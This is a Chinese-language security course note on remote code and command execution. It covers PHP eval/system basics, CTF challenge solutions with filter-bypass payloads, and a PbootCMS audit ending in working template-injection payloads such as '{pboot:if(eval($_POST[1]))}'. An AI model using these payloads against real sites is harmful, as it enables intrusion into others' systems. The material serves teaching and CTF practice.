![1647234059735-b1e022a1-59b7-4ee8-bc21-ed6da80e16ca.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103457281-893193577.png)

```plain
#知识点：
1、RCE执行-代码执行&命令执行
2、CTF考点-漏洞配合&绕过手法
3、利用审计-CMS框架&中间件等

#详细点：
1.为什么会产生此类安全问题
2.此类安全问题探针利用及危害
3.此类安全问题在CTF即CMS分析
漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行
漏洞区别：脚本语言&操作系统(php/java/python/js&windows/linux/mac)
漏洞对象：WEB源码&中间件&其他环境（见漏洞详情对象）
漏洞危害：直接权限丢失,可执行任意脚本代码或系统命令
```

- RCE-原理&探针&利用&危害等

------

```plain
RCE指两方面：代码执行和命令执行
举例:
<?php
//eval代码执行
eval('phpinfo();');
//system命令执行
system('ipconfig');
?>
-RCE代码执行：引用脚本代码解析执行
-RCE命令执行：脚本调用操作系统命令
访问：http://127.0.0.1:8081/web/rce.php
```

![1647234462942-9c4d66ae-a2d6-4418-998c-38a744269c54.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103513286-1845016967.png)

```plain
漏洞函数：
1.PHP：
eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()以及array_map()等
system、shell_exec、popen、passthru、proc_open等
2.Python：
eval exec subprocess os.system commands 
3.Java：
Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，
但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.
探针与发现：
在黑盒中探针这种漏洞几乎是很少几率，功能的实现不知道有没有引用这种函数，而且如果引用的话也不知道怎么去测试。
大部分安全测试是通过白盒，或者别人给出来的漏洞报告。
```

- CTF-29~39-RCE代码命令执行

------

29

```plain
代码：
error_reporting(0); 
if(isset($_GET['c'])){ 
    $c = $_GET['c']; 
    if(!preg_match("/flag/i", $c)){ 
        eval($c); 
    } 
     
}else{ 
    highlight_file(__FILE__); 
}

过滤了flag，可以同通配符进行绕过：system('tac fla*.php');
```

30

```plain
代码：
error_reporting(0); 
if(isset($_GET['c'])){ 
    $c = $_GET['c']; 
    if(!preg_match("/flag|system|php/i", $c)){ 
        eval($c); 
    } 
     
}else{ 
    highlight_file(__FILE__); 
}
过滤了flag,system,php等可以通过取代函数&通配符&管道符
c=echo shell_exec('tac fla*');
c=`cp fla*.ph* 2.txt`;   访问2.txt
```

31

```plain
代码：
error_reporting(0); 
if(isset($_GET['c'])){ 
    $c = $_GET['c']; 
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){ 
        eval($c); 
    } 
     
}else{ 
    highlight_file(__FILE__); 
}
过滤的更多，可以用到参数逃逸，对c参数过滤，我们可以使用1参数来进行传参
c=eval($_GET[1]);&1=system('tac flag.php');
```

32-36

```plain
代码：
error_reporting(0); 
if(isset($_GET['c'])){ 
    $c = $_GET['c']; 
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){ 
        eval($c); 
    } 
     
}else{ 
    highlight_file(__FILE__); 
}

配合包含&伪协议
include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>
include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

37-39

```plain
代码：
error_reporting(0); 
if(isset($_GET['c'])){ 
    $c = $_GET['c']; 
    if(!preg_match("/flag/i", $c)){ 
        include($c); 
        echo $flag; 
     
    } 
         
}else{ 
    highlight_file(__FILE__); 
}
包含&伪协议&通配符
data://text/plain,<?=system('tac fla*');?>
php://input post:<?php system('tac flag.php');?>
```

- CMS-PbootCMS审计-RCE执行

------

```plain
搜索代码执行的特定函数（功能点比较难找）eval
```

![1647236568801-c6eb5576-b309-433e-9dfa-5cf0ed91f638.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103513803-147563177.png)

```plain
找到调用函数的代码：  eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
文件是在apps\home\controller\ParserController.php上 这个源码应该是框架对应的源码，URL和文件对应访问是要弄清楚触发方法和访问路由的。
找到变量matches
```

![1647237199005-13cfa4e3-44e8-4310-8887-64e41150979c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103513427-1628414678.png)

```plain
这个意思是通过$content来控制$matches，通过匹配来产生结果，然后在后面执行eval，函数：preg_match_all是通过$pattern和$content匹配产生$matches
那么继续追踪谁调用了parserIfLabel这个方法，很明显这个是类的写法，在类class ParserController extends Controller里面，谁创建了ParserController这个对象，就会调用eval函数。

全局搜索parserIfLabel函数
```

![1647237524945-e2842769-5c1c-4f5a-8235-40214d9b1b73.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103513872-1915817514.png)

```plain
其实这个就是自己引用他。那么继续跟踪谁调用了parserCommom
```

![1647238063028-59d188a2-1e70-4959-b245-18a15dcfcea9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103513317-9133233.png)

```plain
打开apps\home\controller\AboutController.php中
```

![1647238392192-71a78f15-0809-438f-a6ce-a316ff8406ff.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103513551-371073862.png)

```plain
那么这个文件应该怎么访问呢？
访问http://127.0.0.1:8112/index.php/list/2.html这个地址，对应的文件在哪里呢？
对应的文件应该是apps\home\controller\ListController.php文件

那么同理，访问http://127.0.0.1:8112/index.php/about/10.html这个地址对应的文件应该是apps\home\controller\AboutController.php
继续分析，在前端代码是怎么接受数据的，查看表单值，内容中的变量是content
```

![1647238927632-17e010e6-d403-44c8-88aa-d54425187d42.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103513440-1505532291.png)

```plain
留言，登录后台，显示留言
构造payload：
AboutController：{pboot:if(eval($_POST[1]))}!!!{/pboot:if}
ContentController：/index.php/Content/2?keyword={pboot:if(eval($_REQUEST[1]));//)})}}{/pboot:if}&1=phpinfo();

整体流程：搜索特定函数->parserIfLabel->parserCommom->About&Content->构造
```

- 层面-探针-语言&CMS&中间件等

------

```plain
集成化的平台：http://vulfocus.io/  Shiro weblogic 登录激活就可以使用
集成化工具：G:\xiaoditools2\044-CMS源码&工具集合箱等\GUI_TOOLS_V6.1_by安全圈小王子--bugfixed
```